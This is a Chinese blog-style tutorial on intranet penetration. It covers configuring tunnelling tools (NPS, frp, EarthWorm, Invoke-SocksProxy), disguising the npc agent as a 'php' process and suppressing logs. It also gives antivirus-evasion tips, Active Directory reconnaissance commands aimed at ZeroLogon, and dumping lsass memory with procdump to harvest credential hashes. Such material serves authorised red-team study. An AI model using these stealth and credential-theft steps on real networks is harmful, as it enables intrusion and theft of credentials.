## 背景
​
菜菜鸡最近进入了一个内网，但是菜菜鸡之前没有打过内网，菜菜鸡表示有点不知所措，但是菜菜鸡的老大，大菜菜鸡表示不要慌，大家都没打过，边打边学，这样菜菜鸡就开始了第一次内网渗透之旅。
​ 由于内网庞大，不可能一一介绍知识，所以本文主要介绍一些在本次内网渗透常用且好用的工具、方法和更快达到目标的思路。
## 代理工具
不管在任何渗透中，好的代理工具是必不可少的，好的代理工具能让你在内网中七进七出，穿破对方的防线。
本篇幅有点小长，但可以关注一下里面的一些小trick或者优化。
### NPS
  1. 简介
​ [NPS](https://github.com/ehang-io/nps)是一款用go写的内网穿透工具，它的特性有：
    1. 几乎支持所有协议
    2. 支持内网http代理、内网socks5代理、p2p等
    3. 简洁但功能强大的WEB管理界面
    4. 支持服务端、客户端同时控制
    5. 扩展功能强大
    6. 全平台兼容，一键注册为服务
​
基于以上特性，我们很乐意让它成为我们主要的代理工具。特别是存在web管理界面，使多个客户端管理变得十分轻松，及其存在webapi，可以让我们做一些自动化的事情。
  1. 配置  
a. nps  
nps配置的主要关注的点在：
        # 是否开启http proxy 该功能类似于nginx实现https的处理
    http_proxy_ip=
    http_proxy_port=
    https_proxy_port=
    https_just_proxy=
    # bridge的类型和port 选一个自己想要的port即可
    bridge_type=tcp
    bridge_port=8888
    bridge_ip=0.0.0.0
    # 日志等级和记录 建议不记
    log_level=7
    log_path=/dev/null
    # 客户端连接使用vkey 
    public_vkey=iamavkey
    # nps web管理端配置  建议配置web_host和web_base_url更加安全
    web_host= test.com
    web_username=user
    web_password=pass
    web_port = 12345
    web_ip=0.0.0.0
    web_base_url=/only_login
    # 端口复用
    官方文档如下：
    在一些严格的网络环境中，对端口的个数等限制较大，nps支持强大端口复用功能。将bridge_port、 http_proxy_port、 https_proxy_port 、web_port都设置为同一端口，也能正常使用。
    使用时将需要复用的端口设置为与bridge_port一致即可，将自动识别。
    如需将web管理的端口也复用，需要配置web_host也就是一个二级域名以便区分
​ 除了以上配置，在实际使用中还需要关心客户端的心跳检测频率和超时检测：
        客户端与服务端间会间隔5s相互发送延迟测量包，这个时间间隔不可修改。 可修改延迟测量包丢包的次数，默认为60也就是5分钟都收不到一个延迟测量回包，则会断开客户端连接。 值得注意的是需要客户端的socket关闭，才会进行重连，也就是当客户端无法收到服务端的fin包时，只有客户端自行关闭socket才行。 也就是假如服务端设置为较低值，而客户端设置较高值，而此时服务端断开连接而客户端无法收到服务端的fin包，客户端也会继续等着直到触发客户端的超时设置。
    在nps.conf或npc.conf中设置disconnect_timeout即可，客户端还可附带-disconnect_timeout=60参数启动
​ 如果觉得这个频率过快可以考虑修改源码来适配当前环境。
b. npc
​ npc启动方式可以分为两种，同时npc也支持注册到系统服务的形式进行安装和启动。
​ **无文件形式启动** ：
​ 这种方式首先需要在web端新建一个客户端，
​
​ 配置完了之后，点开该客户端旁边的+(-)，可以展开(收回)客户端的配置详情，其中就有npc启动命令，
​ 在这里分享一些小trick，如果在linux机器上以无文件形式启动，可以用以下命令伪装成php或java：
        mv npc php
    export PATH=.:$PATH
    # 环境变量设置vkey
    export NPC_SERVER_ADDR=1.1.1.1:8024
    export NPC_SERVER_VKEY=xxxxx
    php
​ **配置文件形式启动** ：
        ./npc -config=npc配置文件路径
​ 具体配置可参考[官方文档](https://ehang-io.github.io/nps/#/use)。
  2. bug修复
​
在平时使用中，我们发现npc在windows中使用存在一些Bug：计划任务或其它非服务的system权限npc无法启动，经过debug发现是service这个依赖包存在问题，跟开发团队沟通他们建议自己先临时解决。这是一个非常重要的功能，因为如果我们想要在不保持某个用户登陆的情况下定时运行npc，就需要计划任务/ru
SYSTEM选项
查看npc.go代码可以发现npc是支持不调用service就启动的，所以临时解决方案如下：
        s, err := service.New(prg, svcConfig)
    if err != nil {
    修改成
    if false {
    或者将if里代码提取出来，service代码去掉
### frp
  1. 简介  
frp 是一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS 等多种协议。可以将内网服务以安全、便捷的方式通过具有公网
IP 节点的中转暴露到公网。
从功能上来讲与nps无太大的差别，所以这不赘述了，这里贴出[项目地址](https://github.com/fatedier/frp/)和[配置文档地址](https://gofrp.org/docs/examples/)。
### EarthWorm
  1. 简介：  
EW 是一套便携式的网络穿透工具，具有 SOCKS v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。
        作者已经停止更新，但是网上还是可以找到源码。网上已经有很多关于ew的使用教程，这里不赘述了。
     看到这里可能很多读者又要问了，我已经有了npc、frp和chisel了，为啥还要用ew呢？那么我们考虑一个场景，对方内网有台机器不出网，并且我们只能通过这台机器到达目标网段，这个时候该怎么办？答案很简单，就是使用ew直接在该跳板机开启一个正向socks5监听端口，我们就可以通过该socks5到达目标网段。
  2. 静态免杀  
我们在使用过程中经常遇到的问题是被杀软识别成恶意程序，但ew本身没有恶意行为，所以我们可以通过一些常用的过静态免杀的手法来过杀软：  
a. 重新编译  
b. 取出不需要的字符常量  
建议在本地先测试好再上生产环境，否则被识别了就前功尽弃。除此之外还需要考虑流量特征，这里就留给大家自行发挥了。
### invoke-proxy
  1. 简介
除了ew外，在windows还可以使用powershell脚本进行正向的socks5连接。[Invoke-SocksProxy](https://github.com/p3nt4/Invoke-SocksProxy)就实现了这个功能，当然它还可以进行反向socks5回弹，但是不推荐，或者需要修改源码使用。原因在于它的心跳在于5s，并且时不时会中断，需要修改和测试。
  2. 使用  
在powershell运行
        Import-Module .\Invoke-SocksProxy.psm1;Invoke-SocksProxy -bindPort 1080
即可在机器上监听1080端口并转发请求
## 域信息收集
### 一、前期信息收集
当我们获得一台内网普通机器的权限的时候，需要进行初步的信息收集，才可以确定我们下一步的目标。
假设菜菜鸡现在获取了一台在域内的windows权限，菜菜鸡该做什么呢？上网一搜，唰的一下，出来一堆：
  1. 获取当前所在域的名称  
a. net config Workstation
        net config Workstation
    计算机名                     \\DC
    计算机全名                   DC.test.com
    用户名                       Administrator
    工作站域                     test
    工作站域 DNS 名称            test.com
    登录域                       test
    命令成功完成。
其中 **工作站域** 即是域名称
b. net time /domain
        net time /domain 
    \\DC.test.com 的当前时间是 2021/1/1 20:29:16
c. systeminfo
d. ipconfig /all
  2. 域内相关信息收集  
a. 基本信息查询
        # 查看域管
    net group "domain admins" /domain
    # 获得企业管理员列表
    net group "enterprise admins" /domain 
    # 获得域控列表
    net group "domain controllers" /domain
    # 获得所有域用户列表
    net user /domain  > C:\Windows\Temp\user.txt
    # 获得所有域成员计算机列表
    net group "domain computers" /domain > C:\Windows\Temp\com.txt
    # 获取所有的组，这一步其实是非常重要的，因为专业运维都会分组，并且命名规范，所以如果想要精确打击目标，比如财务、hr、管理员组，就可以直奔目标而去
    net group /domain > C:\Windows\Temp\group.txt
    # 获取域信任信息
    nltest /domain_trusts 
    # 查询域所有spn,也可以查到dc及其主机名,这个命令在搜集计算机分组上也很有用
    setspn -T target.com -Q */* > C:\Windows\Temp\spn.txt
    # nslookup 查询该域所有域控及对应主机名 为CVE-2020-1472 ZeroLogon做准备
    nslookup -type=all _ldap._tcp.dc._msdcs.test.com
    _ldap._tcp.dc._msdcs.test.com     SRV service loc
              priority       = 0
              weight         = 100
              port           = 389
              svr hostname   = dc.test.com
    dc.test.com       internet address = 1.1.1.1
    # 一般来讲，域内DNS跟域控会在一起，所以可以通过nslookup获取dns服务器，不过具有局限性，因为域内通常有多个域控服务器
    nslookup google.com
b. 抓取本机hash
​
菜菜鸡这个时候已经获取了域的基本信息，但是还是有点迷茫，接下来能干什么？菜菜鸡想起了之前在某大厂实习的时候，用的也是域，菜菜鸡用自己的账号本地登录过其它机器，那远程登陆的权限是不是也有？但是通过一番询问和查证，得到的结果是一般都不行。但是域管就可以，所以就开始了找域管账号密码之旅。
​ 由于菜菜鸡进入的是一个sharepoint系统，很大概率本机保存着某些域管的凭据，所以抓取本地hash就成了我们的首要目标。
​ 抓取本地hash网上也有很多文章了，这里介绍一种不上传mimikatz抓取hash的方式，可以有效的规避杀软：
​ 1). 上传[procdump64.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) ，procdump是微软官方提供的工具，所以不用担心免杀问题；
​ 2). 运行 procdump64.exe -accepteula -64 -ma lsass.exe lsass.dmp；